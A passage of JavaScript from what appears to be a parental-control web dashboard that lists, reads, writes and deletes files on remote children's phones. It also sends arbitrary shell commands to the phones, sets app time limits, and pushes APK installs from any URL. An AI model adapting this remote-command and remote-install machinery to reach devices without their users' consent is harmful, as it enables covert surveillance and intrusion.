    const d=await fetch('/files/read?ip='+encodeURIComponent(ip)+'&path='+encodeURIComponent(path)).then(r=>r.json()).catch(e=>({error:String(e)}));
    if(d.error){fmsg('⛔ '+d.error);return;}
    document.getElementById('fSavePath').value=path;
    if(d.b64){document.getElementById('fContent').value='(binary file, '+d.size+' bytes) — '+path;}
    else{document.getElementById('fContent').value=d.text||'';}
    fmsg('✅ loaded '+path);
  },
  async write(){
    const ip=document.getElementById('filePhone').value;
    const path=document.getElementById('fSavePath').value.trim();
    if(!path){fmsg('Set the save path first');return;}
    fmsg('… writing '+path);
    const d=await fetch('/files/write?ip='+encodeURIComponent(ip),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:path,text:document.getElementById('fContent').value})}).then(r=>r.json()).catch(e=>({error:String(e)}));
    fmsg(d.ok?'✅ saved':('⛔ '+(d.error||d.raw||'write failed')));
  },
  async del(){
    const ip=document.getElementById('filePhone').value;
    const path=RP();
    if(!confirm('Delete '+path+'?'))return;
    const d=await fetch('/files/delete?ip='+encodeURIComponent(ip)+'&path='+encodeURIComponent(path)).then(r=>r.json()).catch(e=>({error:String(e)}));
    fmsg(d.ok?'🗑 deleted':'⛔ '+(d.error||d.raw));
    Files.list(path.replace(/\/+$/,'').split('/').slice(0,-1).join('/')||'/');
  }
};

const Term = {
  ip(){ return document.getElementById('termIP').value.trim()||document.getElementById('filePhone').value; },
  async tool(c){
    document.getElementById('termCmd').value=c;
    Term.run();
  },
  async run(){
    const cmd=document.getElementById('termCmd').value.trim();
    if(!cmd)return;
    const d=await fetch('/term/cmd?ip='+encodeURIComponent(Term.ip()),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:cmd})}).then(r=>r.json());
    document.getElementById('termOut').textContent=(d.online?'':'(phone not seen in 90s) ')+'$ '+cmd;
  },
  async hist(){
    const d=await fetch('/term/history?ip='+encodeURIComponent(Term.ip())).then(r=>r.json());
    document.getElementById('termOut').innerHTML=(d.results||[]).map(r=>'['+new Date(r.ts).toLocaleTimeString()+'] '+r.out.replace(/</g,'&lt;').replace(/\\n/g,'<br>')).join('<br>')||'(no results)';
  }
};

function fmsg(s){document.getElementById('fOut').innerHTML='<div class="small">'+s+'</div>';}
function RP(){return document.getElementById('filePath').value.trim()||'/';}

document.getElementById('fList').addEventListener('click', e=>{
  const b=e.target.closest('[data-f]');
  if(!b)return;
  if(b.getAttribute('data-f')==='open') Files.list(b.getAttribute('data-p'));
});

const Lim = {
  ip(){ return document.getElementById('filePhone').value; },
  async refresh(){
    const ip=Lim.ip(); if(!ip) return;
    const d=await fetch('/usage?ip='+encodeURIComponent(ip)).then(r=>r.json());
    const l=await fetch('/limits?ip='+encodeURIComponent(ip)).then(r=>r.json());
    const rows=Object.entries(d.usage||{}).sort((a,b)=>b[1]-a[1]).slice(0,12).map(([p,s])=>
      '<tr><td>'+p+'</td><td>'+(Math.round(s/6)/10)+"min</td><td style='color:gray'>"+(l&&l[p]?l[p]+'min limit':'—')+'</td></tr>').join('');
    document.getElementById('usageOut').innerHTML = rows ?
      "<table style='font-size:12px;width:100%'>"+rows+"</table>" : "no usage reported yet";
  },
  async set(){
    const ip=Lim.ip(); if(!ip){return;}
    await fetch('/limits/'+encodeURIComponent(ip),{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({pkg:document.getElementById('limPkg').value.trim(),min:+document.getElementById('limMin').value||0})});
    Lim.refresh();
  }
};

const OTA = {
  async send(){
    const ip=document.getElementById('filePhone').value;
    const url=document.getElementById('apkUrl').value.trim();
    if(!ip){fmsg('No kid phone selected');return;}
    const d=await fetch('/term/cmd?ip='+encodeURIComponent(ip),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:'update '+url})}).then(r=>r.json());
    fmsg(d.online ? '⬆️ update queued → '+ip : '⚠️ phone seen recently? enqueue sent anyway');
    setTimeout(()=>Term.hist(),6000);
  }
};

setInterval(()=>{loadKids();checkConn();loadPhones();Term.hist()},10000);
loadKids();checkConn();loadPhones();loadDocs();

</script></body></html>`;
